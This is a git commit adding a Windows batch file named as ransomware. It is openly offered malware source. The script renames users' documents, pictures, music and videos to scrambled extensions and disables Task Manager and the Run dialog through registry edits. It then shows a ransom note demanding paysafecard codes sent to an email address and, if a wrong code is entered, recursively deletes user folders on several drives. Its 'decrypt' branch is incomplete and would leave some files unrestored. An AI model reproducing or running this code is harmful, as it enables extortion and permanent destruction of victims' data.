9a7c4fd9f928a88496556fb2019f30aa1bb5eb2b
babycreeper189 <63827080+babycreeper189@users.noreply.github.com>
2020-05-16 11:52:56 -0400

    Create Randsomeware.bat

---
+++ batch/Randsomeware.bat
@@ -0,0 +1,394 @@
+@echo off
+
+set /a txt=%random%
+set /a png=%random%
+set /a jpg=%random%
+set /a jpeg=%random%
+set /a zip=%random%
+set /a mp3=%random%
+set /a mp4=%random%
+set /a mov=%random%
+set /a pdf=%random%
+set /a doc=%random%
+set /a docx=%random%
+set /a rar=%random%
+cls
+
+ren *.eiolelol *.fhigh
+ren *.txt *.fhigh%txt%
+ren *.png *.fhigh%png%
+ren *.jpg *.fhigh%jpg%
+ren *.jpeg *.fhigh%jpeg%
+ren *.zip *.fhigh%zip%
+ren *.mp3 *.fhigh%mp3%
+ren *.mp4 *.fhigh%mp4%
+ren *.mov *.fhigh%mov%
+ren *.pdf *.fhigh%pdf%
+ren *.doc *.fhigh%doc%
+ren *.docx *.fhigh%docx%
+ren *.rar *.fhigh%rar%
+
+
+cd C:\Users\%username%\Pictures
+ren *.eiolelol *.fhigh
+ren *.txt *.fhigh%txt%
+ren *.png *.fhigh%png%
+ren *.jpg *.fhigh%jpg%
+ren *.jpeg *.fhigh%jpeg%
+ren *.zip *.fhigh%zip%
+ren *.mp3 *.fhigh%mp3%
+ren *.mp4 *.fhigh%mp4%
+ren *.mov *.fhigh%mov%
+ren *.pdf *.fhigh%pdf%
+ren *.doc *.fhigh%doc%
+ren *.docx *.fhigh%docx%
+ren *.rar *.fhigh%rar%
+
+cd C:\Users\%username%\Music
+ren *.eiolelol *.fhigh
+ren *.txt *.fhigh%txt%
+ren *.png *.fhigh%png%
+ren *.jpg *.fhigh%jpg%
+ren *.jpeg *.fhigh%jpeg%
+ren *.zip *.fhigh%zip%
+ren *.mp3 *.fhigh%mp3%
+ren *.mp4 *.fhigh%mp4%
+ren *.mov *.fhigh%mov%
+ren *.pdf *.fhigh%pdf%
+ren *.doc *.fhigh%doc%
+ren *.docx *.fhigh%docx%
+ren *.rar *.fhigh%rar%
+
+cd C:\Users\%username%\Downloads
+ren *.eiolelol *.fhigh
+ren *.txt *.fhigh%txt%
+ren *.png *.fhigh%png%
+ren *.jpg *.fhigh%jpg%
+ren *.jpeg *.fhigh%jpeg%
+ren *.zip *.fhigh%zip%
+ren *.mp3 *.fhigh%mp3%
+ren *.mp4 *.fhigh%mp4%
+ren *.mov *.fhigh%mov%
+ren *.pdf *.fhigh%pdf%
+ren *.doc *.fhigh%doc%
+ren *.docx *.fhigh%docx%
+ren *.rar *.fhigh%rar%
+
+cd C:\Users\%username%\Desktop
+ren *.eiolelol *.fhigh
+ren *.txt *.fhigh%txt%
+ren *.png *.fhigh%png%
+ren *.jpg *.fhigh%jpg%
+ren *.jpeg *.fhigh%jpeg%
+ren *.zip *.fhigh%zip%
+ren *.mp3 *.fhigh%mp3%
+ren *.mp4 *.fhigh%mp4%
+ren *.mov *.fhigh%mov%
+ren *.pdf *.fhigh%pdf%
+ren *.doc *.fhigh%doc%
+ren *.docx *.fhigh%docx%
+ren *.rar *.fhigh%rar%
+
+cd C:\Users\%username%\Documents
+ren *.eiolelol *.fhigh
+ren *.txt *.fhigh%txt%
+ren *.png *.fhigh%png%
+ren *.jpg *.fhigh%jpg%
+ren *.jpeg *.fhigh%jpeg%
+ren *.zip *.fhigh%zip%
+ren *.mp3 *.fhigh%mp3%
+ren *.mp4 *.fhigh%mp4%
+ren *.mov *.fhigh%mov%
+ren *.pdf *.fhigh%pdf%
+ren *.doc *.fhigh%doc%
+ren *.docx *.fhigh%docx%
+ren *.rar *.fhigh%rar%
+
+cd C:\Users\%username%\Videos
+ren *.eiolelol *.fhigh
+ren *.txt *.fhigh%txt%
+ren *.png *.fhigh%png%
+ren *.jpg *.fhigh%jpg%
+ren *.jpeg *.fhigh%jpeg%
+ren *.zip *.fhigh%zip%
+ren *.mp3 *.fhigh%mp3%
+ren *.mp4 *.fhigh%mp4%
+ren *.mov *.fhigh%mov%
+ren *.pdf *.fhigh%pdf%
+ren *.doc *.fhigh%doc%
+ren *.docx *.fhigh%docx%
+ren *.rar *.fhigh%rar%
+
+cd D:\Users\%username%\Pictures
+ren *.eiolelol *.fhigh
+ren *.txt *.fhigh%txt%
+ren *.png *.fhigh%png%
+ren *.jpg *.fhigh%jpg%
+ren *.jpeg *.fhigh%jpeg%
+ren *.zip *.fhigh%zip%
+ren *.mp3 *.fhigh%mp3%
+ren *.mp4 *.fhigh%mp4%
+ren *.mov *.fhigh%mov%
+ren *.pdf *.fhigh%pdf%
+ren *.doc *.fhigh%doc%
+ren *.docx *.fhigh%docx%
+ren *.rar *.fhigh%rar%
+
+cd D:\Users\%username%\Music
+ren *.eiolelol *.fhigh
+ren *.txt *.fhigh%txt%
+ren *.png *.fhigh%png%
+ren *.jpg *.fhigh%jpg%
+ren *.jpeg *.fhigh%jpeg%
+ren *.zip *.fhigh%zip%
+ren *.mp3 *.fhigh%mp3%
+ren *.mp4 *.fhigh%mp4%
+ren *.mov *.fhigh%mov%
+ren *.pdf *.fhigh%pdf%
+ren *.doc *.fhigh%doc%
+ren *.docx *.fhigh%docx%
+ren *.rar *.fhigh%rar%
+
+cd D:\Users\%username%\Downloads
+ren *.eiolelol *.fhigh
+ren *.txt *.fhigh%txt%
+ren *.png *.fhigh%png%
+ren *.jpg *.fhigh%jpg%
+ren *.jpeg *.fhigh%jpeg%
+ren *.zip *.fhigh%zip%
+ren *.mp3 *.fhigh%mp3%
+ren *.mp4 *.fhigh%mp4%
+ren *.mov *.fhigh%mov%
+ren *.pdf *.fhigh%pdf%
+ren *.doc *.fhigh%doc%
+ren *.docx *.fhigh%docx%
+ren *.rar *.fhigh%rar%
+
+cd D:\Users\%username%\Desktop
+ren *.eiolelol *.fhigh
+ren *.txt *.fhigh%txt%
+ren *.png *.fhigh%png%
+ren *.jpg *.fhigh%jpg%
+ren *.jpeg *.fhigh%jpeg%
+ren *.zip *.fhigh%zip%
+ren *.mp3 *.fhigh%mp3%
+ren *.mp4 *.fhigh%mp4%
+ren *.mov *.fhigh%mov%
+ren *.pdf *.fhigh%pdf%
+ren *.doc *.fhigh%doc%
+ren *.docx *.fhigh%docx%
+ren *.rar *.fhigh%rar%
+
+cd D:\Users\%username%\Documents
+ren *.eiolelol *.fhigh
+ren *.txt *.fhigh%txt%
+ren *.png *.fhigh%png%
+ren *.jpg *.fhigh%jpg%
+ren *.jpeg *.fhigh%jpeg%
+ren *.zip *.fhigh%zip%
+ren *.mp3 *.fhigh%mp3%
+ren *.mp4 *.fhigh%mp4%
+ren *.mov *.fhigh%mov%
+ren *.pdf *.fhigh%pdf%
+ren *.doc *.fhigh%doc%
+ren *.docx *.fhigh%docx%
+ren *.rar *.fhigh%rar%
+
+cd D:\Users\%username%\Videos
+ren *.eiolelol *.fhigh
+ren *.txt *.fhigh%txt%
+ren *.png *.fhigh%png%
+ren *.jpg *.fhigh%jpg%
+ren *.jpeg *.fhigh%jpeg%
+ren *.zip *.fhigh%zip%
+ren *.mp3 *.fhigh%mp3%
+ren *.mp4 *.fhigh%mp4%
+ren *.mov *.fhigh%mov%
+ren *.pdf *.fhigh%pdf%
+ren *.doc *.fhigh%doc%
+ren *.docx *.fhigh%docx%
+ren *.rar *.fhigh%rar%
+
+
+REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d %txt% /f
+
+REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d %txt% /f
+
+cls
+
+echo Hello! Most of your important files have been encrypted by creeperWare
+echo Buy a paysafecard of any currency and amount and send the code to this email: fhighransom@protonmail.com
+echo DONT CLOSE THIS WINDOW OR YOUR FILES ARE GONE FOREVER!
+echo After that you will be sent the code to decrypt your files! 
+echo You have one try to enter the correct password!
+
+:codentry
+color a
+set /p dekoodi=DECRYPTION CODE:
+if "%dekoodi%"=="67tdg2uuu4rywiy7hiiiiiii.iii&iiiiii[rofjiw4rjxfp23o4ijr89y hH&P:Ik'[pl'[pr\fwe[rpl\g[l65.\['ypl\456'\[t;yl\45[6plhy\456[lyb[\56pbyl54\,y6p4\5[6by;lg\';664y\l\45[p6lyb\456pl\'46;ly[\6pbl\y[5p6lbg.\[65344444444$oiuhfoiuhuhuhurhufhuewiufhi786)(*()(*()()(*(&*&(*&werh-_-iufh[43y82wo5tiwp54tiq3T$%TW$B@Y$Y" goto :pelastuit
+if not "%dekoodi%"=="67tdg2uuu4rywiy7hiiiiiii.iii&iiiiii[rofjiw4rjxfp23o4ijr89y hH&P:Ik'[pl'[pr\fwe[rpl\g[l65.\['ypl\456'\[t;yl\45[6plhy\456[lyb[\56pbyl54\,y6p4\5[6by;lg\';664y\l\45[p6lyb\456pl\'46;ly[\6pbl\y[5p6lbg.\[65344444444$oiuhfoiuhuhuhurhufhuewiufhi786)(*()(*()()(*(&*&(*&werh-_-iufh[43y82wo5tiwp54tiq3T$%TW$B@Y$Y" goto :vituiksmeni
+
+:vituiksmeni
+echo WRONG PASSWORD!
+echo Deleting Files!
+del C:\Users\%username%\Videos /s /f /q
+del C:\Users\%username%\Documents /s /f /q
+del C:\Users\%username%\Downloads /s /f /q
+del C:\Users\%username%\Pictures /s /f /q
+del C:\Users\%username%\Music /s /f /q
+del C:\Users\%username%\Desktop /s /f /q
+del D:\Users\%username%\Videos /s /f /q
+del D:\Users\%username%\Documents /s /f /q
+del D:\Users\%username%\Downloads /s /f /q
+del D:\Users\%username%\Pictures /s /f /q
+del D:\Users\%username%\Music /s /f /q
+del D:\Users\%username%\Desktop /s /f /q
+del E:\Users\%username%\Videos /s /f /q
+del E:\Users\%username%\Documents /s /f /q
+del E:\Users\%username%\Downloads /s /f /q
+del E:\Users\%username%\Pictures /s /f /q
+del E:\Users\%username%\Music /s /f /q
+del E:\Users\%username%\Desktop /s /f /q
+echo Im very sorry if you had important files on this machine
+timeout 5
+EXIT /B %errorlevel%
+
+:pelastuit
+echo Decrypting files....
+
+ren *.fhigh%txt% *.txt
+ren *.fhigh%png% *.png
+ren *.fhigh%jpg% *.jpg
+ren *.fhigh%jpeg% *.jpeg
+ren *.fhigh%zip% *.zip
+ren *.fhigh%mp3% *.mp3
+ren *.fhigh%mp4% *.mp4
+ren *.fhigh%mov% *.mov
+ren *.fhigh%pdf% *.pdf
+ren *.fhigh%doc% *.doc
+ren *.fhigh%docx% *.docx
+ren *.fhigh%rar% *.rar
+
+cd C:\Users\%username%\Pictures
+ren *.fhigh%txt% *.txt
+ren *.fhigh%png% *.png
+ren *.fhigh%jpg% *.jpg
+ren *.fhigh%jpeg% *.jpeg
+ren *.fhigh%zip% *.zip
+ren *.fhigh%mp3% *.mp3
+ren *.fhigh%mp4% *.mp4
+ren *.fhigh%mov% *.mov
+ren *.fhigh%pdf% *.pdf
+ren *.fhigh%doc% *.doc
+ren *.fhigh%docx% *.docx
+ren *.fhigh%rar% *.rar
+
+
+cd C:\Users\%username%\Desktop
+ren *.fhigh%txt% *.txt
+ren *.fhigh%png% *.png
+ren *.fhigh%jpg% *.jpg
+ren *.fhigh%jpeg% *.jpeg
+ren *.fhigh%zip% *.zip
+ren *.fhigh%mp3% *.mp3
+ren *.fhigh%mp4% *.mp4
+ren *.fhigh%mov% *.mov
+ren *.fhigh%pdf% *.pdf
+ren *.fhigh%doc% *.doc
+ren *.fhigh%docx% *.docx
+ren *.fhigh%rar% *.rar
+
+cd C:\Users\%username%\Pictures
+ren *.fhigh%txt% *.txt
+ren *.fhigh%png% *.png
+ren *.fhigh%jpg% *.jpg
+ren *.fhigh%jpeg% *.jpeg
+ren *.fhigh%zip% *.zip
+ren *.fhigh%mp3% *.mp3
+ren *.fhigh%mp4% *.mp4
+ren *.fhigh%mov% *.mov
+ren *.fhigh%pdf% *.pdf
+ren *.fhigh%doc% *.doc
+ren *.fhigh%docx% *.docx
+ren *.fhigh%rar% *.rar
+
+cd C:\Users\%username%\Pictures
+ren *.fhigh%txt% *.txt
+ren *.fhigh%png% *.png
+ren *.fhigh%jpg% *.jpg
+ren *.fhigh%jpeg% *.jpeg
+ren *.fhigh%zip% *.zip
+ren *.fhigh%mp3% *.mp3
+ren *.fhigh%mp4% *.mp4
+ren *.fhigh%mov% *.mov
+ren *.fhigh%pdf% *.pdf
+ren *.fhigh%doc% *.doc
+ren *.fhigh%docx% *.docx
+ren *.fhigh%rar% *.rar
+
+cd C:\Users\%username%\Videos
+ren *.fhigh%txt% *.txt
+ren *.fhigh%png% *.png
+ren *.fhigh%jpg% *.jpg
+ren *.fhigh%jpeg% *.jpeg
+ren *.fhigh%zip% *.zip
+ren *.fhigh%mp3% *.mp3
+ren *.fhigh%mp4% *.mp4
+ren *.fhigh%mov% *.mov
+ren *.fhigh%pdf% *.pdf
+ren *.fhigh%doc% *.doc
+ren *.fhigh%docx% *.docx
+ren *.fhigh%rar% *.rar
+
+
+cd C:\Users\%username%\Music
+ren *.fhigh%txt% *.txt
+ren *.fhigh%png% *.png
+ren *.fhigh%jpg% *.jpg
+ren *.fhigh%jpeg% *.jpeg
+ren *.fhigh%zip% *.zip
+ren *.fhigh%mp3% *.mp3
+ren *.fhigh%mp4% *.mp4
+ren *.fhigh%mov% *.mov
+ren *.fhigh%pdf% *.pdf
+ren *.fhigh%doc% *.doc
+ren *.fhigh%docx% *.docx
+ren *.fhigh%rar% *.rar
+
+
+cd C:\Users\%username%\Downloads
+ren *.fhigh%txt% *.txt
+ren *.fhigh%png% *.png
+ren *.fhigh%jpg% *.jpg
+ren *.fhigh%jpeg% *.jpeg
+ren *.fhigh%zip% *.zip
+ren *.fhigh%mp3% *.mp3
+ren *.fhigh%mp4% *.mp4
+ren *.fhigh%mov% *.mov
+ren *.fhigh%pdf% *.pdf
+ren *.fhigh%doc% *.doc
+ren *.fhigh%docx% *.docx
+ren *.fhigh%rar% *.rar
+
+cd C:\Users\%username%\Documents
+ren *.fhigh%txt% *.txt
+ren *.fhigh%png% *.png
+ren *.fhigh%jpg% *.jpg
+ren *.fhigh%jpeg% *.jpeg
+ren *.fhigh%zip% *.zip
+ren *.fhigh%mp3% *.mp3
+ren *.fhigh%mp4% *.mp4
+ren *.fhigh%mov% *.mov
+ren *.fhigh%pdf% *.pdf
+ren *.fhigh%doc% *.doc
+ren *.fhigh%docx% *.docx
+ren *.fhigh%rar% *.rar
+
+REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f
+
+REG delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /f
+
+echo Files Decrypted successfully! 
+timeout 5
+
+exit /b %errorlevel%
